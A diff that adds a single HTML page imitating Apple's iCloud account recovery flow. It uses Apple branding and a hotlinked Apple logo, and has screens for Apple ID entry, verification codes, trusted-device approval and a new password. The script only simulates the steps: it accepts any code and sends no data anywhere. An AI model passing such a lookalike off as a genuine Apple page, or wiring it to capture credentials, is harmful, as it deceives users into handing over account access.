@@ -1,0 +1,906 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iCloud Account Recovery</title>
+    <style>
+        /* Apple's San Francisco Font */
+        @font-face {
+            font-family: 'SF Pro Display';
+            src: url('https://applesocial.s3.amazonaws.com/assets/styles/fonts/sanfrancisco/sanfranciscodisplay-regular-webfont.woff2') format('woff2');
+            font-weight: 400;
+            font-style: normal;
+        }
+        
+        @font-face {
+            font-family: 'SF Pro Display';
+            src: url('https://applesocial.s3.amazonaws.com/assets/styles/fonts/sanfrancisco/sanfranciscodisplay-semibold-webfont.woff2') format('woff2');
+            font-weight: 600;
+            font-style: normal;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        body {
+            background-color: #f5f5f7;
+            color: #1d1d1f;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .apple-header {
+            height: 44px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            padding: 0 16px;
+        }
+
+        .apple-header-title {
+            font-size: 17px;
+            font-weight: 600;
+            color: #000;
+        }
+
+        .apple-back-btn {
+            position: absolute;
+            left: 16px;
+            color: #0071e3;
+            font-size: 17px;
+            text-decoration: none;
+        }
+
+        .container {
+            flex: 1;
+            padding: 32px 16px;
+            max-width: 500px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        .apple-card {
+            background-color: #fff;
+            border-radius: 12px;
+            padding: 32px;
+            margin-bottom: 16px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        .apple-logo {
+            width: 44px;
+            height: 44px;
+            margin: 0 auto 24px;
+            display: block;
+        }
+
+        .apple-title {
+            font-size: 28px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 16px;
+            color: #1d1d1f;
+        }
+
+        .apple-subtitle {
+            font-size: 17px;
+            color: #86868b;
+            text-align: center;
+            margin-bottom: 32px;
+            line-height: 1.4;
+        }
+
+        .apple-input-container {
+            margin-bottom: 24px;
+        }
+
+        .apple-input-label {
+            display: block;
+            font-size: 13px;
+            margin-bottom: 8px;
+            color: #86868b;
+            font-weight: 600;
+        }
+
+        .apple-input {
+            width: 100%;
+            height: 52px;
+            padding: 16px;
+            border: 1px solid #d2d2d7;
+            border-radius: 12px;
+            font-size: 17px;
+            transition: border-color 0.2s;
+        }
+
+        .apple-input:focus {
+            outline: none;
+            border-color: #0071e3;
+        }
+
+        .apple-btn {
+            width: 100%;
+            height: 50px;
+            background-color: #0071e3;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 17px;
+            font-weight: 600;
+            margin-top: 16px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .apple-btn:hover {
+            background-color: #0077ed;
+        }
+
+        .apple-btn:disabled {
+            background-color: #a7a7a7;
+            cursor: not-allowed;
+        }
+
+        .apple-btn-secondary {
+            background-color: transparent;
+            color: #0071e3;
+            border: 1px solid #d2d2d7;
+        }
+
+        .apple-btn-secondary:hover {
+            background-color: rgba(0, 113, 227, 0.05);
+        }
+
+        .apple-divider {
+            display: flex;
+            align-items: center;
+            margin: 24px 0;
+            color: #86868b;
+            font-size: 13px;
+        }
+
+        .apple-divider::before,
+        .apple-divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #d2d2d7;
+        }
+
+        .apple-divider::before {
+            margin-right: 16px;
+        }
+
+        .apple-divider::after {
+            margin-left: 16px;
+        }
+
+        .apple-verification-method {
+            display: flex;
+            align-items: center;
+            padding: 16px;
+            border: 1px solid #d2d2d7;
+            border-radius: 12px;
+            margin-bottom: 16px;
+            cursor: pointer;
+            transition: border-color 0.2s;
+        }
+
+        .apple-verification-method:hover {
+            border-color: #0071e3;
+        }
+
+        .apple-verification-icon {
+            width: 40px;
+            height: 40px;
+            background-color: #f5f5f7;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 16px;
+            color: #0071e3;
+            font-size: 20px;
+        }
+
+        .apple-verification-info h3 {
+            font-size: 17px;
+            margin-bottom: 4px;
+            color: #1d1d1f;
+        }
+
+        .apple-verification-info p {
+            font-size: 13px;
+            color: #86868b;
+        }
+
+        .apple-code-inputs {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 32px;
+        }
+
+        .apple-code-input {
+            width: 50px;
+            height: 60px;
+            border: 1px solid #d2d2d7;
+            border-radius: 8px;
+            font-size: 24px;
+            text-align: center;
+            transition: border-color 0.2s;
+        }
+
+        .apple-code-input:focus {
+            outline: none;
+            border-color: #0071e3;
+        }
+
+        .apple-resend-link {
+            color: #0071e3;
+            font-size: 17px;
+            text-align: center;
+            display: block;
+            margin-top: 16px;
+            text-decoration: none;
+        }
+
+        .apple-error-message {
+            color: #ff3b30;
+            font-size: 13px;
+            margin-top: 8px;
+            display: none;
+        }
+
+        /* Apple Loading Animation */
+        .apple-loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.8);
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+
+        .apple-loading-spinner {
+            width: 44px;
+            height: 44px;
+            border: 3px solid rgba(0, 113, 227, 0.1);
+            border-radius: 50%;
+            border-top-color: #0071e3;
+            animation: apple-spin 1s linear infinite;
+            margin-bottom: 16px;
+        }
+
+        .apple-loading-text {
+            font-size: 17px;
+            color: #1d1d1f;
+        }
+
+        @keyframes apple-spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Apple Success Animation */
+        .apple-success-animation {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 24px;
+            position: relative;
+        }
+
+        .apple-success-circle {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            border: 4px solid #34c759;
+            box-sizing: border-box;
+            position: absolute;
+            animation: apple-scale 0.3s ease-in-out;
+        }
+
+        .apple-success-check {
+            width: 40px;
+            height: 20px;
+            border-left: 4px solid #34c759;
+            border-bottom: 4px solid #34c759;
+            position: absolute;
+            left: 16px;
+            top: 30px;
+            transform: rotate(-45deg) scale(0);
+            animation: apple-draw 0.5s 0.3s ease-in-out forwards;
+        }
+
+        @keyframes apple-scale {
+            0% { transform: scale(0); }
+            80% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        @keyframes apple-draw {
+            0% { transform: rotate(-45deg) scale(0); }
+            100% { transform: rotate(-45deg) scale(1); }
+        }
+
+        /* Apple Device Selection */
+        .apple-device-list {
+            margin-bottom: 24px;
+        }
+
+        .apple-device {
+            display: flex;
+            align-items: center;
+            padding: 16px;
+            border: 1px solid #d2d2d7;
+            border-radius: 12px;
+            margin-bottom: 12px;
+            cursor: pointer;
+            transition: border-color 0.2s;
+        }
+
+        .apple-device:hover {
+            border-color: #0071e3;
+        }
+
+        .apple-device-icon {
+            width: 40px;
+            height: 40px;
+            background-color: #f5f5f7;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 16px;
+            color: #0071e3;
+            font-size: 20px;
+        }
+
+        .apple-device-info h3 {
+            font-size: 17px;
+            margin-bottom: 4px;
+            color: #1d1d1f;
+        }
+
+        .apple-device-info p {
+            font-size: 13px;
+            color: #86868b;
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div class="apple-loading-overlay" id="loadingScreen">
+        <div class="apple-loading-spinner"></div>
+        <div class="apple-loading-text">Processing...</div>
+    </div>
+
+    <!-- Start Page -->
+    <div id="startPage">
+        <div class="apple-header">
+            <h1 class="apple-header-title">Account Recovery</h1>
+        </div>
+        <div class="container">
+            <div class="apple-card">
+                <img src="https://www.apple.com/ac/globalnav/7/en_US/images/be15095f-5a20-57d0-ad14-cf4c638e223a/globalnav_apple_image__b5er5ngrzxqq_large.svg" alt="Apple Logo" class="apple-logo">
+                <h2 class="apple-title">Reset Your Password</h2>
+                <p class="apple-subtitle">Enter your Apple ID to begin the account recovery process.</p>
+                
+                <div class="apple-input-container">
+                    <label class="apple-input-label">Apple ID</label>
+                    <input type="email" class="apple-input" id="appleId" placeholder="name@example.com" required>
+                    <div class="apple-error-message" id="appleIdError">Please enter a valid Apple ID</div>
+                </div>
+                
+                <button class="apple-btn" id="continueBtn" disabled>Continue</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Verification Method Page -->
+    <div id="verificationMethodPage" style="display: none;">
+        <div class="apple-header">
+            <a href="#" class="apple-back-btn" onclick="goBackToStartPage()">Back</a>
+            <h1 class="apple-header-title">Account Recovery</h1>
+        </div>
+        <div class="container">
+            <div class="apple-card">
+                <h2 class="apple-title">Account Recovery</h2>
+                <p class="apple-subtitle">Choose how you want to reset your password.</p>
+                
+                <div class="apple-verification-method" onclick="selectVerificationMethod('phone')">
+                    <div class="apple-verification-icon">
+                        <i class="fas fa-mobile-alt"></i>
+                    </div>
+                    <div class="apple-verification-info">
+                        <h3>Use phone number</h3>
+                        <p>We'll send a verification code to your trusted phone number</p>
+                    </div>
+                </div>
+                
+                <div class="apple-verification-method" onclick="selectVerificationMethod('email')">
+                    <div class="apple-verification-icon">
+                        <i class="fas fa-envelope"></i>
+                    </div>
+                    <div class="apple-verification-info">
+                        <h3>Use email</h3>
+                        <p>We'll send a verification code to your recovery email</p>
+                    </div>
+                </div>
+                
+                <div class="apple-divider">or</div>
+                
+                <div class="apple-verification-method" onclick="selectVerificationMethod('device')">
+                    <div class="apple-verification-icon">
+                        <i class="fas fa-laptop"></i>
+                    </div>
+                    <div class="apple-verification-info">
+                        <h3>Use trusted device</h3>
+                        <p>Approve from another device signed in with your Apple ID</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Phone Verification Page -->
+    <div id="phoneVerificationPage" style="display: none;">
+        <div class="apple-header">
+            <a href="#" class="apple-back-btn" onclick="goBackToMethodPage()">Back</a>
+            <h1 class="apple-header-title">Account Recovery</h1>
+        </div>
+        <div class="container">
+            <div class="apple-card">
+                <h2 class="apple-title">Enter the code sent to your phone</h2>
+                <p class="apple-subtitle" id="phoneVerificationDescription">Enter the 6-digit code sent to ••••••••••</p>
+                
+                <div class="apple-code-inputs">
+                    <input type="text" class="apple-code-input" maxlength="1" oninput="moveToNext(this, 1)">
+                    <input type="text" class="apple-code-input" maxlength="1" oninput="moveToNext(this, 2)">
+                    <input type="text" class="apple-code-input" maxlength="1" oninput="moveToNext(this, 3)">
+                    <input type="text" class="apple-code-input" maxlength="1" oninput="moveToNext(this, 4)">
+                    <input type="text" class="apple-code-input" maxlength="1" oninput="moveToNext(this, 5)">
+                    <input type="text" class="apple-code-input" maxlength="1" oninput="moveToNext(this, 6)">
+                </div>
+                
+                <div class="apple-error-message" id="codeError">Incorrect code. Please try again.</div>
+                
+                <button class="apple-btn" id="verifyPhoneBtn" disabled onclick="verifyPhoneCode()">Continue</button>
+                
+                <a href="#" class="apple-resend-link" onclick="resendPhoneCode()">Resend code</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Email Verification Page -->
+    <div id="emailVerificationPage" style="display: none;">
+        <div class="apple-header">
+            <a href="#" class="apple-back-btn" onclick="goBackToMethodPage()">Back</a>
+            <h1 class="apple-header-title">Account Recovery</h1>
+        </div>
+        <div class="container">
+            <div class="apple-card">
+                <h2 class="apple-title">Enter the code sent to your email</h2>
+                <p class="apple-subtitle" id="emailVerificationDescription">Enter the 6-digit code sent to a••••@example.com</p>
+                
+                <div class="apple-code-inputs">
+                    <input type="text" class="apple-code-input" maxlength="1" oninput="moveToNext(this, 1)">
+                    <input type="text" class="apple-code-input" maxlength="1" oninput="moveToNext(this, 2)">
+                    <input type="text" class="apple-code-input" maxlength="1" oninput="moveToNext(this, 3)">
+                    <input type="text" class="apple-code-input" maxlength="1" oninput="moveToNext(this, 4)">
+                    <input type="text" class="apple-code-input" maxlength="1" oninput="moveToNext(this, 5)">
+                    <input type="text" class="apple-code-input" maxlength="1" oninput="moveToNext(this, 6)">
+                </div>
+                
+                <div class="apple-error-message" id="emailCodeError">Incorrect code. Please try again.</div>
+                
+                <button class="apple-btn" id="verifyEmailBtn" disabled onclick="verifyEmailCode()">Continue</button>
+                
+                <a href="#" class="apple-resend-link" onclick="resendEmailCode()">Resend code</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Trusted Device Selection Page -->
+    <div id="deviceSelectionPage" style="display: none;">
+        <div class="apple-header">
+            <a href="#" class="apple-back-btn" onclick="goBackToMethodPage()">Back</a>
+            <h1 class="apple-header-title">Account Recovery</h1>
+        </div>
+        <div class="container">
+            <div class="apple-card">
+                <h2 class="apple-title">Approve from another device</h2>
+                <p class="apple-subtitle">Choose a device to approve your password reset.</p>
+                
+                <div class="apple-device-list">
+                    <div class="apple-device" onclick="selectDevice('iphone')">
+                        <div class="apple-device-icon">
+                            <i class="fas fa-mobile-alt"></i>
+                        </div>
+                        <div class="apple-device-info">
+                            <h3>iPhone 13 Pro</h3>
+                            <p>Last used 2 hours ago</p>
+                        </div>
+                    </div>
+                    
+                    <div class="apple-device" onclick="selectDevice('macbook')">
+                        <div class="apple-device-icon">
+                            <i class="fas fa-laptop"></i>
+                        </div>
+                        <div class="apple-device-info">
+                            <h3>MacBook Pro</h3>
+                            <p>Last used yesterday</p>
+                        </div>
+                    </div>
+                    
+                    <div class="apple-device" onclick="selectDevice('ipad')">
+                        <div class="apple-device-icon">
+                            <i class="fas fa-tablet-alt"></i>
+                        </div>
+                        <div class="apple-device-info">
+                            <h3>iPad Air</h3>
+                            <p>Last used 3 days ago</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Device Approval Page -->
+    <div id="deviceApprovalPage" style="display: none;">
+        <div class="apple-header">
+            <a href="#" class="apple-back-btn" onclick="goBackToDeviceSelection()">Back</a>
+            <h1 class="apple-header-title">Account Recovery</h1>
+        </div>
+        <div class="container">
+            <div class="apple-card">
+                <h2 class="apple-title">Approval required</h2>
+                <p class="apple-subtitle">A notification has been sent to your device. Approve the request to reset your password.</p>
+                
+                <div style="text-align: center; margin: 40px 0;">
+                    <div class="apple-loading-spinner" style="margin: 0 auto 16px;"></div>
+                    <p>Waiting for approval...</p>
+                </div>
+                
+                <button class="apple-btn apple-btn-secondary" onclick="cancelDeviceApproval()">Cancel</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- New Password Page -->
+    <div id="newPasswordPage" style="display: none;">
+        <div class="apple-header">
+            <h1 class="apple-header-title">Account Recovery</h1>
+        </div>
+        <div class="container">
+            <div class="apple-card">
+                <h2 class="apple-title">Create a new password</h2>
+                <p class="apple-subtitle">Your new password must be different from previous passwords.</p>
+                
+                <div class="apple-input-container">
+                    <label class="apple-input-label">New password</label>
+                    <input type="password" class="apple-input" id="newPassword" placeholder="Enter new password" required>
+                    <div class="apple-error-message" id="passwordError">Password must be at least 8 characters</div>
+                </div>
+                
+                <div class="apple-input-container">
+                    <label class="apple-input-label">Confirm password</label>
+                    <input type="password" class="apple-input" id="confirmPassword" placeholder="Enter password again" required>
+                    <div class="apple-error-message" id="confirmPasswordError">Passwords don't match</div>
+                </div>
+                
+                <button class="apple-btn" id="setPasswordBtn" disabled onclick="setNewPassword()">Reset Password</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Page -->
+    <div id="successPage" style="display: none;">
+        <div class="apple-header">
+            <h1 class="apple-header-title">Account Recovery</h1>
+        </div>
+        <div class="container">
+            <div class="apple-card">
+                <div class="apple-success-animation">
+                    <div class="apple-success-circle"></div>
+                    <div class="apple-success-check"></div>
+                </div>
+                <h2 class="apple-title">Password Changed</h2>
+                <p class="apple-subtitle">Your Apple ID password has been successfully updated.</p>
+                
+                <button class="apple-btn" onclick="completeRecovery()">Done</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Global variables
+        let appleId = '';
+        let verificationMethod = '';
+        let selectedDevice = '';
+        let countdownInterval;
+        let countdownTime = 30;
+        let deviceApprovalTimeout;
+
+        // Initialize form validation
+        document.addEventListener('DOMContentLoaded', function() {
+            // Apple ID input validation
+            document.getElementById('appleId').addEventListener('input', validateAppleId);
+            
+            // Password input validation
+            document.getElementById('newPassword').addEventListener('input', validatePassword);
+            document.getElementById('confirmPassword').addEventListener('input', validatePassword);
+            
+            // Set up continue button
+            document.getElementById('continueBtn').addEventListener('click', proceedToVerificationMethod);
+            
+            // Set up verification code inputs
+            const codeInputs = document.querySelectorAll('.apple-code-input');
+            codeInputs.forEach(input => {
+                input.addEventListener('input', function() {
+                    validateVerificationCode(this.parentElement);
+                });
+            });
+        });
+
+        // Validate Apple ID
+        function validateAppleId() {
+            const email = document.getElementById('appleId').value;
+            const isValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+            document.getElementById('continueBtn').disabled = !isValid;
+            document.getElementById('appleIdError').style.display = isValid ? 'none' : 'block';
+            return isValid;
+        }
+
+        // Validate password
+        function validatePassword() {
+            const password = document.getElementById('newPassword').value;
+            const confirmPassword = document.getElementById('confirmPassword').value;
+            
+            const isPasswordValid = password.length >= 8;
+            const doPasswordsMatch = password === confirmPassword && password.length > 0;
+            
+            document.getElementById('passwordError').style.display = isPasswordValid ? 'none' : 'block';
+            document.getElementById('confirmPasswordError').style.display = doPasswordsMatch ? 'none' : 'block';
+            
+            const isValid = isPasswordValid && doPasswordsMatch;
+            document.getElementById('setPasswordBtn').disabled = !isValid;
+            
+            return isValid;
+        }
+
+        // Validate verification code
+        function validateVerificationCode(container) {
+            const codeInputs = container.querySelectorAll('.apple-code-input');
+            let allFilled = true;
+            
+            codeInputs.forEach(input => {
+                if (!input.value) allFilled = false;
+            });
+            
+            const verifyBtn = container.parentElement.querySelector('.apple-btn');
+            if (verifyBtn) verifyBtn.disabled = !allFilled;
+            
+            return allFilled;
+        }
+
+        // Show loading screen with random delay
+        function showLoadingScreen() {
+            document.getElementById('loadingScreen').style.display = 'flex';
+            const randomDelay = Math.floor(Math.random() * 2000) + 1000; // 1-3 seconds
+            
+            return new Promise(resolve => {
+                setTimeout(() => {
+                    document.getElementById('loadingScreen').style.display = 'none';
+                    resolve();
+                }, randomDelay);
+            });
+        }
+
+        // Proceed to verification method selection
+        async function proceedToVerificationMethod() {
+            if (!validateAppleId()) return;
+            
+            await showLoadingScreen();
+            
+            appleId = document.getElementById('appleId').value;
+            document.getElementById('startPage').style.display = 'none';
+            document.getElementById('verificationMethodPage').style.display = 'block';
+        }
+
+        // Go back to start page
+        async function goBackToStartPage() {
+            await showLoadingScreen();
+            document.getElementById('verificationMethodPage').style.display = 'none';
+            document.getElementById('startPage').style.display = 'block';
+        }
+
+        // Go back to method selection page
+        async function goBackToMethodPage() {
+            await showLoadingScreen();
+            document.getElementById('phoneVerificationPage').style.display = 'none';
+            document.getElementById('emailVerificationPage').style.display = 'none';
+            document.getElementById('deviceSelectionPage').style.display = 'none';
+            document.getElementById('verificationMethodPage').style.display = 'block';
+        }
+
+        // Go back to device selection page
+        async function goBackToDeviceSelection() {
+            clearTimeout(deviceApprovalTimeout);
+            await showLoadingScreen();
+            document.getElementById('deviceApprovalPage').style.display = 'none';
+            document.getElementById('deviceSelectionPage').style.display = 'block';
+        }
+
+        // Select verification method
+        function selectVerificationMethod(method) {
+            verificationMethod = method;
+            
+            if (method === 'phone') {
+                showPhoneVerification();
+            } else if (method === 'email') {
+                showEmailVerification();
+            } else if (method === 'device') {
+                showDeviceSelection();
+            }
+        }
+
+        // Show phone verification page
+        async function showPhoneVerification() {
+            await showLoadingScreen();
+            
+            // Mask phone number (in a real app, this would come from Apple's API)
+            const maskedPhone = '••••••••1234';
+            document.getElementById('phoneVerificationDescription').textContent = 
+                `Enter the 6-digit code sent to ${maskedPhone}`;
+            
+            document.getElementById('verificationMethodPage').style.display = 'none';
+            document.getElementById('phoneVerificationPage').style.display = 'block';
+            
+            // Start countdown for resend
+            startCountdown('.apple-resend-link');
+        }
+
+        // Show email verification page
+        async function showEmailVerification() {
+            await showLoadingScreen();
+            
+            // Mask email (in a real app, this would come from Apple's API)
+            const maskedEmail = appleId.substring(0, 1) + '••••@' + appleId.split('@')[1];
+            document.getElementById('emailVerificationDescription').textContent = 
+                `Enter the 6-digit code sent to ${maskedEmail}`;
+            
+            document.getElementById('verificationMethodPage').style.display = 'none';
+            document.getElementById('emailVerificationPage').style.display = 'block';
+            
+            // Start countdown for resend
+            startCountdown('.apple-resend-link');
+        }
+
+        // Show device selection page
+        async function showDeviceSelection() {
+            await showLoadingScreen();
+            document.getElementById('verificationMethodPage').style.display = 'none';
+            document.getElementById('deviceSelectionPage').style.display = 'block';
+        }
+
+        // Select device for approval
+        async function selectDevice(device) {
+            selectedDevice = device;
+            await showLoadingScreen();
+            document.getElementById('deviceSelectionPage').style.display = 'none';
+            document.getElementById('deviceApprovalPage').style.display = 'block';
+            
+            // Simulate device approval after 5 seconds
+            deviceApprovalTimeout = setTimeout(approveFromDevice, 5000);
+        }
+
+        // Cancel device approval
+        async function cancelDeviceApproval() {
+            clearTimeout(deviceApprovalTimeout);
+            await showLoadingScreen();
+            document.getElementById('deviceApprovalPage').style.display = 'none';
+            document.getElementById('deviceSelectionPage').style.display = 'block';
+        }
+
+        // Approve from device
+        async function approveFromDevice() {
+            await showLoadingScreen();
+            document.getElementById('deviceApprovalPage').style.display = 'none';
+            document.getElementById('newPasswordPage').style.display = 'block';
+        }
+
+        // Verify phone code
+        async function verifyPhoneCode() {
+            await showLoadingScreen();
+            document.getElementById('phoneVerificationPage').style.display = 'none';
+            document.getElementById('newPasswordPage').style.display = 'block';
+        }
+
+        // Verify email code
+        async function verifyEmailCode() {
+            await showLoadingScreen();
+            document.getElementById('emailVerificationPage').style.display = 'none';
+            document.getElementById('newPasswordPage').style.display = 'block';
+        }
+
+        // Resend phone code
+        async function resendPhoneCode() {
+            await showLoadingScreen();
+            startCountdown('.apple-resend-link');
+            alert('A new verification code has been sent to your phone.');
+        }
+
+        // Resend email code
+        async function resendEmailCode() {
+            await showLoadingScreen();
+            startCountdown('.apple-resend-link');
+            alert('A new verification code has been sent to your email.');
+        }
+
+        // Set new password
+        async function setNewPassword() {
+            if (!validatePassword()) return;
+            
+            await showLoadingScreen();
+            document.getElementById('newPasswordPage').style.display = 'none';
+            document.getElementById('successPage').style.display = 'block';
+        }
+
+        // Complete recovery
+        function completeRecovery() {
+            alert('Account recovery completed successfully!');
+            // In a real app, this would redirect to iCloud or the Apple ID management page
+        }
+
+        // Move to next input field in code verification
+        function moveToNext(input, nextIndex) {
+            if (input.value.length === 1) {
+                const nextInput = input.parentElement.querySelector(`.apple-code-input:nth-child(${nextIndex + 1})`);
+                if (nextInput) {
+                    nextInput.focus();
+                }
+            }
+            validateVerificationCode(input.parentElement);
+        }
+
+        // Start countdown timer for resend
+        function startCountdown(selector) {
+            clearInterval(countdownInterval);
+            countdownTime = 30;
+            updateCountdown(selector);
+            countdownInterval = setInterval(() => updateCountdown(selector), 1000);
+        }
+
+        // Update countdown display
+        function updateCountdown(selector) {
+            const resendLink = document.querySelector(selector);
+            if (!resendLink) return;
+            
+            if (countdownTime > 0) {
+                resendLink.textContent = `Resend code in ${countdownTime}s`;
+                resendLink.style.pointerEvents = 'none';
+                resendLink.style.color = '#86868b';
+                countdownTime--;
+            } else {
+                clearInterval(countdownInterval);
+                resendLink.textContent = 'Resend code';
+                resendLink.style.pointerEvents = 'auto';
+                resendLink.style.color = '#0071e3';
+            }
+        }
+    </script>
+</body>
+</html>
